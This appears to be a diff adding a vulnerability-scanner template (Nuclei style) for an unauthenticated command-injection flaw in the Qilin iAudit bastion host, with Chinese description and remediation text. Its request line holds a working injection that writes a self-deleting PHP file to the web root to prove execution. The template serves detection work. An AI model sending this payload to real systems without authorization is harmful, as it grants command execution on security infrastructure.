@@ -1,0 +1,34 @@
+id: Qilin-Bastion-HostRce
+info:
+  name: iAudit-fortressaircraft-rce
+  author:
+  - l0ne1y
+  description: |-
+    中远麒麟iAudit运维审计系统未授权远程命令执行漏洞
+    中远麒麟iAudit运维审计系统，是北京中远麒麟科技有限公司开发的软硬件一体化统一安全运维平台（堡垒机），该产品支持对企业运维人员在运维过程中进行统一身份认证、统一授权、统一审计、统一监控。
+
+    中远麒麟iAudit运维审计系统存在未授权远程命令执行漏洞，近期已发现针对该漏洞的在野利用。get_luser_by_sshport.php接口获取路径变量时，存在未经过滤的字符串拼接，攻击者可利用该漏洞注入命令，获取堡垒机系统权限。
+  severity: critical
+  remediation: |-
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：https://www.tosec.com.cn/
+
+    临时修复方案：
+    1. 禁止将中远麒麟iAudit运维审计系统映射到公网
+    2. 在安管设备对get_luser_by_sshport.php接口做访问限制
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code_1==200 && status_code_2==200
+    - contains(body_2,verify)
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/get_luser_by_sshport.php?clientip=1;echo%20"<?php%20echo%20{{verify}};unlink(__FILE__);?>">/opt/freesvr/web/htdocs/freesvr/audit/{{filename}}.php;&clientport=1'
+  - '{{BaseURL}}/{{filename}}.php'
+  method: GET
+  req-condition: true
+variables:
+  filename: '{{rand_text_alpha(6, "abc")}}'
+  verify: '{{rand_text_alphanumeric(8,"")}}'
